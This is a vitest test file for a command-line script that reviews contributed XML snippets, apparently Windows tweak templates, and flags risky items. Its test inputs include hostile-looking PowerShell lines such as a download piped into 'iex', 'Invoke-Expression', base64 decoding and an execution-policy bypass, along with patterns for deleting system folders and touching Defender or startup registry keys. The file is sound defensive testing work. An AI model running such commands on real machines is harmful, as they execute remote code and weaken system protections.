/// <reference types="node" />
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import { execFileSync } from 'node:child_process'
import { writeFileSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'

/**
 * The review script is what stands between a contributed snippet and a reviewer's
 * attention, so its detection patterns are worth pinning. It is a Node CLI rather than a
 * module, so these run it as a subprocess and read the report.
 */

const scriptPath = resolve(dirname(fileURLToPath(import.meta.url)), '../../scripts/review-submission.mjs')
let dir: string

beforeAll(() => { dir = mkdtempSync(join(tmpdir(), 'wo-review-')) })
afterAll(() => { rmSync(dir, { recursive: true, force: true }) })

/** Build a one-item snippet around the given item body. */
function snippet(itemBody: string): string {
  const file = join(dir, `s${Math.random().toString(36).slice(2)}.xml`)
  writeFileSync(file, `<?xml version="1.0" encoding="utf-8"?>
<Items>
  <Metadata>
    <Version>1</Version><SchemaVersion>1</SchemaVersion>
    <Id>t-1</Id><Name>Test</Name><Description>d</Description><Author>a</Author>
  </Metadata>
  <SupportedOS></SupportedOS>
  ${itemBody}
</Items>`)
  return file
}

function review(file: string): { out: string; code: number } {
  try {
    return { out: execFileSync('node', [scriptPath, file], { encoding: 'utf-8' }), code: 0 }
  } catch (err) {
    const e = err as { stdout?: string; stderr?: string; status?: number }
    return { out: (e.stdout ?? '') + (e.stderr ?? ''), code: e.status ?? 1 }
  }
}

const psItem = (script: string) => `
  <Item>
    <Name>Script</Name><Type>PowerShell</Type><Category>C</Category><Order>100</Order>
    <OS></OS>
    <PowerShell><Engine>powershell</Engine><Script><![CDATA[${script}]]></Script></PowerShell>
  </Item>`

const ffItem = (path: string, action = 'Remove') => `
  <Item>
    <Name>File</Name><Type>FileFolder</Type><Category>C</Category><Order>100</Order>
    <OS></OS>
    <FileFolder><Path>${path}</Path><Action>${action}</Action><ItemType>Folder</ItemType><NewName></NewName></FileFolder>
  </Item>`

const regItem = (path: string, action = 'SetValue') => `
  <Item>
    <Name>Reg</Name><Type>Registry</Type><Category>C</Category><Order>100</Order>
    <OS></OS>
    <Registry><Hive>HKLM</Hive><Name>V</Name><Path>${path}</Path><Action>${action}</Action><Value>1</Value><Type>DWord</Type></Registry>
  </Item>`

describe('PowerShell detection', () => {
  it.each([
    ['iwr http://x/y.ps1 | iex',          'downloads from the network'],
    ['Invoke-Expression $payload',        'executes a string as code'],
    ['[System.Reflection.Assembly]::Load($b)', 'loads or compiles code at runtime'],
    ['[Convert]::FromBase64String($x)',   'runs base64-encoded content'],
    ['Start-Process notepad.exe',         'starts another process'],
    ['Remove-Item C:\\Temp -Recurse',     'recursively deletes'],
    ['Set-ExecutionPolicy Bypass',        'changes the execution policy'],
  ])('flags %j', (script, label) => {
    const { out } = review(snippet(psItem(script)))
    expect(out).toContain('NEEDS REVIEW')
    expect(out).toContain(label)
  })

  it('still surfaces a harmless script, just without a reason', () => {
    // Any PowerShell deserves reading; the labels only say why it is urgent.
    const { out } = review(snippet(psItem('Write-Host "hello"')))
    expect(out).toContain('PowerShell "Script"')
    expect(out).not.toContain('NEEDS REVIEW')
  })

  it('shows the script so the reviewer does not have to open the file', () => {
    const { out } = review(snippet(psItem('iex $evil')))
    expect(out).toContain('iex $evil')
  })
})

describe('file and registry detection', () => {
  it.each(['C:\\Windows\\System32', 'C:\\Program Files', 'C:\\Users', 'C:\\'])(
    'flags a delete under %s', (path) => {
      const { out } = review(snippet(ffItem(path)))
      expect(out).toContain('NEEDS REVIEW')
      expect(out).toContain('system location')
    })

  it('ignores a delete somewhere ordinary', () => {
    const { out } = review(snippet(ffItem('C:\\Temp\\cache')))
    expect(out).toContain('nothing flagged')
  })

  it('flags a recursive registry delete', () => {
    const { out } = review(snippet(regItem('SOFTWARE\\Vendor', 'DeleteKeyRecursively')))
    expect(out).toContain('NEEDS REVIEW')
    expect(out).toContain('recursive registry delete')
  })

  it.each([
    ['SOFTWARE\\Policies\\Microsoft\\Windows', 'group policy'],
    ['SOFTWARE\\Microsoft\\Windows Defender', 'Defender'],
    ['SYSTEM\\CurrentControlSet\\Services\\X', 'service configuration'],
    ['SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'startup programs'],
  ])('notes %s as worth a look', (path, label) => {
    const { out } = review(snippet(regItem(path)))
    expect(out).toContain('worth a look')
    expect(out).toContain(label)
  })

  it('says nothing about an ordinary registry key', () => {
    const { out } = review(snippet(regItem('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced')))
    expect(out).toContain('nothing flagged')
  })
})

describe('exit codes', () => {
  it('exits 0 for a flagged file, flags are prompts, not rejections', () => {
    expect(review(snippet(psItem('iex $x'))).code).toBe(0)
  })

  it('exits 1 for a file it cannot read', () => {
    const bad = join(dir, 'bad.xml')
    writeFileSync(bad, '<not-a-template/>')
    const { out, code } = review(bad)
    expect(code).toBe(1)
    expect(out).toContain('no <Items> root')
  })

  it('exits 1 for a missing file', () => {
    expect(review(join(dir, 'nope.xml')).code).toBe(1)
  })
})

describe('summary', () => {
  it('reports the item types and counts', () => {
    const { out } = review(snippet(regItem('SOFTWARE\\X') + ffItem('C:\\Temp')))
    expect(out).toMatch(/Registry 1/)
    expect(out).toMatch(/FileFolder 1/)
    expect(out).toContain('2 items')
  })
})
